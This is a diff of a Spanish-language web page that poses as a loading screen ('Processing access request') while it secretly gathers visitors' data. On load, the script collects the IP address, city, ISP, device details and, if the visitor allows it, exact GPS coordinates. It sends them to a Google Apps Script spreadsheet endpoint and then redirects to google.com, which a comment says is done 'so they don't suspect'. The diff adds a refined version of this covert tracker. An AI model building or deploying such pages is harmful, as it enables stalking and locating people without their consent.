@@ -3,75 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando contenido...</title>
+    <title>Cargando...</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f7f9; color: #333; }
+        .container { text-align: center; padding: 20px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div style="text-align: center;">
-        <div class="loader" style="margin: 0 auto 10px;"></div>
-        <p>Cargando información segura...</p>
+    <div class="container">
+        <div class="loader"></div>
+        <p>Procesando solicitud de acceso...</p>
+        <p style="font-size: 12px; color: #888;">Por favor, espera un momento.</p>
     </div>
 
     <script>
-        async function enviarDatos(datos) {
-            const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxBoNhdXNPe8qdEXCwFM6bCnkVkz-BMcrexWfClQzazELI60XWTs6KQlJ4-qNlZYXpknQ/exec' ; // <--- PEGA TU URL AQUÍ
-            
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxBoNhdXNPe8qdEXCwFM6bCnkVkz-BMcrexWfClQzazELI60XWTs6KQlJ4-qNlZYXpknQ/exec'; // <--- CAMBIA ESTO
+
+        async function enviarAExcel(datos) {
             try {
                 await fetch(SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify(datos)
                 });
-            } catch (error) {
-                console.error("Error al enviar:", error);
-            } finally {
-                // Redirigir después de 3 segundos pase lo que pase
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com"; 
-                }, 3000);
-            }
+            } catch (e) { console.error("Error al guardar:", e); }
+            
+            // Redirección final para que no sospechen
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 1500);
         }
 
-        async function iniciarCaptura() {
-            // 1. Obtener IP y datos básicos
-            let ip = "Desconocida";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch (e) { console.log("No se pudo obtener IP"); }
-
-            const datos = {
-                ip: ip,
+        async function iniciarProyecto() {
+            let datos = {
+                ip: "Desconocida",
+                location: "No disponible",
                 device: navigator.userAgent,
-                location: "Permiso denegado",
                 screen: `${window.screen.width}x${window.screen.height}`,
-                time: new Date().toLocaleString()
+                time: new Date().toLocaleString('es-CL')
             };
 
-            // 2. Intentar obtener GPS
+            // 1. Obtener ubicación por IP (Ciudad, Región, ISP)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const ipData = await res.json();
+                datos.ip = ipData.ip;
+                datos.location = `IP: ${ipData.city}, ${ipData.region}, ${ipData.country_name} (${ipData.org})`;
+            } catch (e) { console.log("Error en IP API"); }
+
+            // 2. Intentar obtener GPS Exacto
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        datos.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-                        enviarDatos(datos);
+                        // Si acepta, concatenamos Ciudad + Coordenadas exactas
+                        datos.location += ` | GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`;
+                        enviarAExcel(datos);
                     },
                     (err) => {
-                        console.log("El usuario rechazó el GPS");
-                        enviarDatos(datos); // Enviamos los datos aunque no haya GPS
+                        // Si rechaza, enviamos lo que ya tenemos (la ciudad por IP)
+                        console.log("GPS rechazado, usando ubicación por IP");
+                        enviarAExcel(datos);
                     },
-                    { timeout: 10000 }
+                    { timeout: 6000 }
                 );
             } else {
-                enviarDatos(datos);
+                enviarAExcel(datos);
             }
         }
 
-        iniciarCaptura();
+        iniciarProyecto();
     </script>
 </body>
 </html>
